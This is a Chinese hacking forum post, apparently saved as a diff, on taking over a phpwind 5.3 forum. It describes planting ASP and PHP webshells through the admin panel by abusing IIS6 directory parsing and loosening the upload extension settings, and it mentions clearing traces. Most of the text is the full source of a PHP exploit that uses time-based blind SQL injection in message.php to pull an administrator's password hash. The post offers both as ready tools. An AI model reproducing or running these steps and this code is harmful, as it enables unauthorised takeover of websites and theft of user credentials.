@@ -1,0 +1,158 @@
+phpwind5.3后台拿shell
+
+[phpwind5.3后台拿shell 全文]
+国外的牛人 1月1号写的傻瓜工具，3月远渡重洋 来访中国。
+            顿时掀起一场血雨腥风。。。。
+             N多黑客站论坛纷纷被“黑”  
+            昨天还在愁着怎么拿shell，
+           还要多谢马骏同志的提醒，
+           方法1： php.exe本地包含。 （我也解释不清楚，我根本就不会php）
+           我要介绍的就是
+          方法2：03服务器文件解析问题。
+           今天我就着重讲一下 这个方法。（PHP不行，asp咱还能乱讲几句）
+          
+首先当了一下傻瓜玩了一下玩具，进了傻B后台。
+            在“核心设置”中 点“ 动态目录”
+            修改   “附件保存目录：”   原内容“attachment” 为XX.asp
+             提交修改
+
+然后在“核心设置”中 点“法帖与附件”        修改 “上传附件允许后缀(空格隔开)：” 内容 添加 asp 和php后缀。
+        提交修改。
+
+   在前台发贴， 上传附件   传一个asp小马。 
+  
+    在到后台    如图：[attach]1511[/attach]    附件编辑   用户名填写自己传马的用户。将会搜索到自己刚刚上传的 asp后门
+
+    会发现 如图[attach]1512[/attach]   猛一看， 靠这能用吗。 当然可以吖。
+
+     准备传大马，当然我们要传php的了。 肯定是上传成功的。。
+  
+      不过这里要注意 上传目录要修改。不应该在xx.asp之后了。。。
+    直接在根目录也行 只   于是乎。 [attach]1513[/attach]
+
+           然后把目录恢复 删除刚才上传的asp后门。 清理一下痕迹（好像我从来都不做）。
+               大概就这样。。。 可是有一点让我特别难过，我那php马的密码 我不知道是多少。55555555555
+
+       另外奉上利用程序的源码版。
+      <?php
+print_r("
+
++------------------------------------------------------------------+
+
+Exploit For Phpwind 5.X Version
+BY Loveshell
+Just For Fun :)
+
++------------------------------------------------------------------+
+");
+
+ini_set("max_execution_time",0);
+error_reporting(7);
+
+$bbspath="$argv[2]";
+$server="$argv[1]";
+$cookie=''1ae40_lastfid=0; 1ae40_ol_offset=776; 1ae40_ck_info=%2F%09.72m.net; 1ae40_winduser=A1QKBgE9UFxUUwAHDloFUAMIAFxeUgIMWgFUVVYDAA8HBFQNUVA%3D; 1ae40_lastvisit=0%091173612527%09%2Fbbs%2Findex.php%3F;
+$useragent="Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)";
+$uid=intval($argv[3])>0 ? intval($argv[3]):1;
+
+echo "\r\n#Logging\t........";
+if(islogin()) echo "Login Ok!\r\n";
+else die("Not Login!\tCheck Your Cookie and Useragent!\r\n");
+
+echo "#Testing\t........";
+if(test()) echo "Vul!\r\n";
+else die("Not Vul");
+
+$hashtable=''0123456789abcdef'';
+$count=0;
+
+echo "#Cracking\t\r\n\r\n";
+
+for($i=1;$i<=16;$i++){
+echo "第\t$i\t位:";
+$subpass=crack($i+8);
+$password=$password.$subpass;
+echo "$subpass\r\n";
+}
+
+echo "Password:\t$password";
+
+echo "\r\nGood Luck $count Times\r\n";
+
+function send($cmd,$path)
+{
+global $bbspath,$server,$cookie,$count,$useragent,$debug,$evilip;
+
+$path=$bbspath."$path";
+$message = "POST ".$path." HTTP/1.1\r\n";
+$message .= "Accept: */*\r\n";
+$message .= "Accept-Language: zh-cn\r\n";
+$message .= "Referer: http://".$server.$path."\r\n";
+$message .= "Content-Type: application/x-www-form-urlencoded\r\n";
+$message .= "User-Agent: ".$useragent."\r\n";
+$message .= "Host: ".$server."\r\n";
+$message .= "Content-length: ".strlen($cmd)."\r\n";
+$message .= "Connection: Keep-Alive\r\n";
+$message .= "Cookie: ".$cookie."\r\n";
+$message .= "\r\n";
+$message .= $cmd."\r\n";
+
+$count=$count+1;
+$fd = fsockopen( $server, 80 );
+fputs($fd,$message);
+$resp = "<pre>";
+while($fd&&!feof($fd)) {
+$resp .= fread($fd,1024);
+}
+fclose($fd);
+$resp .="</pre>";
+if($debug) {echo $cmd;echo $resp;}
+// echo $resp;
+return $resp;
+}
+
+function sqlject($sql){
+global $uid;
+$data=''action=pubmsg&readmsg=0)'';
+$data=$data." union select BENCHMARK(1000000,md5(12345)) from pw_members where uid=$uid and $sql".''/*'';
+$echo=send($data,''message.php'');
+preg_match("/Total (.*)\(/i",$echo,$matches);
+if($matches[1]>2) return 1;
+else return 0;
+}
+
+function test(){
+global $uid;
+$data=''action=pubmsg&readmsg=0)'';
+$echo=send($data,''message.php'');
+if(strpos($echo,''MySQL Server Error'')) return 1;
+else return 0;
+}
+
+function islogin(){
+global $uid;
+$data=''action=pubmsg&readmsg=0)'';
+$echo=send($data,''message.php'');
+if(strpos($echo,''login.php"'')) return 0;
+else return 1;
+}
+
+function crack($i){
+global $hashtable;
+
+$sql="mid(password,$i,1)>0x".bin2hex(''8'');
+if(sqlject($sql)){
+$a=8;
+$b=15;}
+else {
+$a=0;
+$b=8;
+}
+
+for($tmp=$a;$tmp<=$b;$tmp++){
+$sql="mid(password,$i,1)=0x".bin2hex($hashtable[$tmp]);
+if(sqlject($sql)) return $hashtable[$tmp];
+}
+crack($i);
+}
+?>
